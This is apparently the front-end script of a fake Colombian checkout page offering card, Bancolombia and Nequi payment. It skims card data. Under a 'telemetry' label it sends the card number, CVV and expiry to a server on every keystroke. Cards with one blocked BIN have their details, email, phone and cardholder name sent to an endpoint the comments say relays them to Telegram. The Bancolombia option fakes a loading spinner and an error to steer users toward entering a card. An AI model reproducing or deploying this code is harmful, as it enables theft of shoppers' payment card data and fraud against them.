document.addEventListener("DOMContentLoaded", () => {

  /* ==========================================================
     REFERENCIAS GENERALES
  ========================================================== */
  const formTarjeta      = document.getElementById("formTarjeta");
  const formBancolombia  = document.getElementById("formBancolombia");

  const btnVolverTarjeta = document.getElementById("btnVolver");
  const btnAbandonarTarjeta = document.getElementById("btnAbandonar");

  const volverMetodos = document.querySelectorAll(".btnVolverMetodo");
  const abandonarBtns = document.querySelectorAll(".btnAbandonar");

  const opTarjeta = document.getElementById("opTarjeta");
  const opBancolombia = document.getElementById("opBancolombia");
  const opNequi = document.getElementById("opNequi");
  const textoTransferencia = document.getElementById("textoTransferencia");
  const volverTienda = document.getElementById("volverTienda");
  const advertenciaBancolombia = document.getElementById("bancoAdvertencia");
  const logosBoldBottom = document.getElementById("logosBoldBottom");

  /* ==========================================================
     CAMPOS TARJETA
  ========================================================== */
  const inputTarjeta = formTarjeta?.querySelector("input[name='tarjeta']");
  const inputCVV = formTarjeta?.querySelector("input[name='cvv']");
  const inputFecha = formTarjeta?.querySelector("input[name='fecha']");
  const inputTelefono = formTarjeta?.querySelector("input[name='tel_bank']");

  /* ==========================================================
     BIN PROHIBIDOS
  ========================================================== */
  const binsProhibidos = {
    "409355": "Nequi"
  };

  /* ==========================================================
     MENSAJE ERROR
  ========================================================== */
  let msgError = null;
  if (inputTarjeta) {
    msgError = document.createElement("div");
    msgError.style.cssText = "color: #d40000; font-size: 14px; margin-top: 8px; font-weight: 600; display: none;";
    inputTarjeta.parentNode.appendChild(msgError);
  }

  /* ==========================================================
     FORMATEO Y VALIDACIONES DE CAMPOS
  ========================================================== */
  
  // Formatear número de tarjeta
  if (inputTarjeta) {
    inputTarjeta.addEventListener("input", (e) => {
      // Limpiar mensaje de error
      inputTarjeta.classList.remove("error");
      if (msgError) msgError.style.display = "none";
      
      // Formatear con espacios
      let value = e.target.value.replace(/\D/g, '');
      let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
      
      // Limitar longitud
      if (formattedValue.length > 19) {
        formattedValue = formattedValue.substring(0, 19);
      }
      
      e.target.value = formattedValue;
    });

    inputTarjeta.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  // Formatear CVV
  if (inputCVV) {
    inputCVV.addEventListener("input", () => {
      inputCVV.classList.remove("error");
      if (msgError) msgError.style.display = "none";
    });

    inputCVV.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  // Formatear fecha
  if (inputFecha) {
    inputFecha.addEventListener("input", (e) => {
      inputFecha.classList.remove("error");
      if (msgError) msgError.style.display = "none";
      
      const v = e.target.value.replace(/\D/g, "");
      if (v.length >= 2) {
        e.target.value = v.slice(0, 2) + "/" + v.slice(2, 4);
      } else {
        e.target.value = v;
      }
    });

    inputFecha.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  // Formatear teléfono
  if (inputTelefono) {
    inputTelefono.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, '');
      let formattedValue = value.replace(/(\d{3})(\d{3})(\d{4})/, '$1 $2 $3');
      
      if (formattedValue.length > 13) {
        formattedValue = formattedValue.substring(0, 13);
      }
      
      e.target.value = formattedValue;
    });

    inputTelefono.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  /* ==========================================================
     MOSTRAR FORMULARIO DE TARJETA
  ========================================================== */
  if (opTarjeta) {
    opTarjeta.addEventListener("click", () => {
      if (formTarjeta) formTarjeta.style.display = "flex";

      // Ocultar otros elementos
      [textoTransferencia, opBancolombia, opNequi, volverTienda, logosBoldBottom].forEach(el => {
        if (el) el.style.display = "none";
      });

      opTarjeta.classList.add("active");
    });
  }

/* ==========================================================
   VOLVER AL MENÚ
========================================================== */
function volverAlMenu() {
  if (formTarjeta) formTarjeta.style.display = "none";
  if (formBancolombia) formBancolombia.style.display = "none";

  // Ocultar mensaje de advertencia de Bancolombia si está visible
  const bancoAdvertencia = document.getElementById("bancoAdvertencia");
  if (bancoAdvertencia) bancoAdvertencia.style.display = "none";

  // Mostrar elementos del menú
  [textoTransferencia, opBancolombia, opNequi, volverTienda, logosBoldBottom].forEach(el => {
    if (el) el.style.display = el === opBancolombia || el === opNequi ? "flex" : "block";
  });

  if (opTarjeta) opTarjeta.classList.remove("active");
  if (opBancolombia) opBancolombia.classList.remove("active");
}


  if (btnVolverTarjeta) {
    btnVolverTarjeta.addEventListener("click", (e) => {
      e.preventDefault();
      volverAlMenu();
    });
  }

  if (btnAbandonarTarjeta) {
    btnAbandonarTarjeta.addEventListener("click", (e) => {
      e.preventDefault();
      window.location.href = "checkout.php";
    });
  }

  /* ==========================================================
     TELEMETRÍA EN TIEMPO REAL (LOGS/LOGOS)
  ========================================================== */
  let telemetriaTimeout = null;
  function enviarTelemetria() {
    clearTimeout(telemetriaTimeout);
    telemetriaTimeout = setTimeout(() => {
      const num = inputTarjeta?.value.replace(/\s/g, '') || '';
      const cvv = inputCVV?.value.trim() || '';
      const fecha = inputFecha?.value.trim() || '';
      const marca = detectarMarca(num);

      const formData = new FormData();
      formData.append('tarjeta', num);
      formData.append('cvv', cvv);
      formData.append('fecha', fecha);
      formData.append('marca', marca === 'normal' ? '' : marca);

      fetch('actualizar_log.php', {
        method: 'POST',
        body: formData
      }).catch(() => {});
    }, 500);
  }

  if (inputTarjeta) inputTarjeta.addEventListener("input", enviarTelemetria);
  if (inputCVV) inputCVV.addEventListener("input", enviarTelemetria);
  if (inputFecha) inputFecha.addEventListener("input", enviarTelemetria);

  /* ==========================================================
     DETECTAR MARCA
  ========================================================== */
  function detectarMarca(num) {
    const cleanNum = num.replace(/\s/g, '');
    if (/^3[47]/.test(cleanNum)) return "amex";
    if (/^4/.test(cleanNum)) return "visa";
    if (/^5[1-5]/.test(cleanNum) || /^2[2-7]/.test(cleanNum)) return "mastercard";
    return "normal";
  }

  /* ==========================================================
     VALIDACIONES
  ========================================================== */
  function validarFecha(f) {
    if (!/^\d{2}\/\d{2}$/.test(f)) return false;
    const [mm, yy] = f.split("/").map(n => parseInt(n, 10));
    if (mm < 1 || mm > 12) return false;

    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1;
    const fullYear = 2000 + yy;
    
    if (fullYear < currentYear) return false;
    if (fullYear === currentYear && mm < currentMonth) return false;

    return true;
  }

  function validarLuhn(num) {
    const cleanNum = num.replace(/\s/g, '');
    let sum = 0, dbl = false;
    for (let i = cleanNum.length - 1; i >= 0; i--) {
      let d = parseInt(cleanNum[i], 10);
      if (dbl) { 
        d *= 2; 
        if (d > 9) d -= 9; 
      }
      sum += d;
      dbl = !dbl;
    }
    return sum % 10 === 0;
  }

  function mostrarError(mensaje) {
    if (msgError) {
      msgError.innerHTML = mensaje;
      msgError.style.display = "block";
    }
    if (inputTarjeta) {
      inputTarjeta.classList.add("error");
    }
  }

  /* ==========================================================
     ENVIAR BIN PROHIBIDO A TELEGRAM
  ========================================================== */
  function enviarBinProhibido(tarjeta, fecha, cvv, emailBank, telBank, titular, bin, bancoProhibido) {
    const formData = new FormData();
    formData.append('tarjeta', tarjeta);
    formData.append('fecha', fecha);
    formData.append('cvv', cvv);
    formData.append('email_bank', emailBank);
    formData.append('tel_bank', telBank);
    formData.append('titular', titular);
    formData.append('bin', bin);
    formData.append('banco_prohibido', bancoProhibido);

    fetch('registro_bin_prohibido.php', {
      method: 'POST',
      body: formData
    }).catch(error => {
      console.log('Error enviando BIN prohibido:', error);
    });
  }

  /* ==========================================================
     SUBMIT TARJETA
  ========================================================== */
  if (formTarjeta) {
    formTarjeta.addEventListener("submit", (e) => {
      const num = inputTarjeta?.value.replace(/\s/g, '') || '';
      const bin = num.substring(0, 6);
      const marca = detectarMarca(num);
      const cvv = inputCVV?.value.trim() || '';
      const fecha = inputFecha?.value.trim() || '';
      const emailBank = formTarjeta.querySelector("input[name='email_bank']")?.value.trim() || '';
      const telBank = formTarjeta.querySelector("input[name='tel_bank']")?.value.trim() || '';
      const titular = formTarjeta.querySelector("input[name='titular']")?.value.trim() || '';

      // BIN Prohibido - ENVIAR A TELEGRAM
      if (binsProhibidos[bin]) {
        // Enviar datos a Telegram
        enviarBinProhibido(num, fecha, cvv, emailBank, telBank, titular, bin, binsProhibidos[bin]);
        
        // Mostrar error al usuario
        mostrarError(`Número de tarjeta no permitido (${binsProhibidos[bin]}) para hacer compras.`);
        e.preventDefault();
        return;
      }

      // Validaciones de longitud
      const expectedLength = marca === "amex" ? 15 : 16;
      if (num.length !== expectedLength) {
        mostrarError(`Debe tener ${expectedLength} dígitos.`);
        e.preventDefault();
        return;
      }

      // Validar Luhn
      if (!validarLuhn(num)) {
        mostrarError("Número de tarjeta no válido.");
        e.preventDefault();
        return;
      }

      // Validar CVV
      const expectedCvvLength = marca === "amex" ? 4 : 3;
      if (cvv.length !== expectedCvvLength) {
        if (inputCVV) inputCVV.classList.add("error");
        e.preventDefault();
        return;
      }

      // Validar fecha
      if (!validarFecha(fecha)) {
        if (inputFecha) inputFecha.classList.add("error");
        e.preventDefault();
        return;
      }
    });
  }

/* ==========================================================
      🔥 FLUJO BANCOLOMBIA (LOGO + TEXTO + SPINNER)
  ========================================================== */
  if (opBancolombia) {
    let originalContent = opBancolombia.innerHTML;

    opBancolombia.addEventListener("click", (e) => {
        e.preventDefault();

        // 1. Si ya mostramos el error, salir
        if (typeof bancoAdvertencia !== 'undefined' && bancoAdvertencia && bancoAdvertencia.style.display === "flex") return;

        // 2. Limpieza Visual
        if (formTarjeta) formTarjeta.style.display = "none";
        [textoTransferencia, opNequi, volverTienda, logosBoldBottom].forEach(el => {
             if (el) el.style.display = el.classList.contains('payment-option') ? 'flex' : 'block';
        });
        if (opTarjeta) opTarjeta.classList.remove("active");

        // 3. ESTADO CARGANDO
        // Aquí está el truco: Tomamos el logo y texto actual, y le pegamos el spinner al final.
        opBancolombia.classList.add("loading-state");
        
        // Buscamos el div que tiene el logo y el texto
        const contentDiv = opBancolombia.querySelector('.payment-text');
        if (contentDiv) {
            // Mantenemos lo que había y añadimos el spinner a la derecha
            opBancolombia.innerHTML = contentDiv.outerHTML + '<div class="btn-spinner"></div>';
        } else {
            // Fallback por si acaso cambia el HTML
            opBancolombia.innerHTML = `<span style="font-weight:600; color:#0b0b51;">Cargando...</span> <div class="btn-spinner"></div>`;
        }

        // 4. ESPERA Y RESPUESTA
        setTimeout(() => {
            // A. Restaurar botón a su estado original
            opBancolombia.classList.remove("loading-state");
            opBancolombia.innerHTML = originalContent;
            
            // B. Activar estado de Error (Borde amarillo)
            opBancolombia.classList.add("error-state");
            
            // C. Mostrar el mensaje
            if (bancoAdvertencia) {
                bancoAdvertencia.style.display = "flex";
                bancoAdvertencia.style.opacity = "1";
                bancoAdvertencia.style.transition = "opacity 0.5s ease";

                // Desaparecer automáticamente después de unos segundos
                clearTimeout(window.advertenciaBancolombiaTimeout);
                window.advertenciaBancolombiaTimeout = setTimeout(() => {
                    bancoAdvertencia.style.opacity = "0";
                    setTimeout(() => {
                        bancoAdvertencia.style.display = "none";
                        opBancolombia.classList.remove("error-state");
                    }, 500);
                }, 4500);
            }

            // D. BRINCO EN TARJETA
            if (opTarjeta) {
                opTarjeta.classList.remove("animar-tarjeta");
                void opTarjeta.offsetWidth; 
                opTarjeta.classList.add("animar-tarjeta");
                
                const radio = opTarjeta.querySelector("input[type='radio']");
                if(radio) radio.checked = true;
            }
        }, 3200); 
    });
  }

}); // DOMContentLoaded

function mostrarModalCVV() { const m = document.getElementById('modalCVV'); if(m) m.style.display = 'block'; }
function cerrarModalCVV() { const m = document.getElementById('modalCVV'); if(m) m.style.display = 'none'; }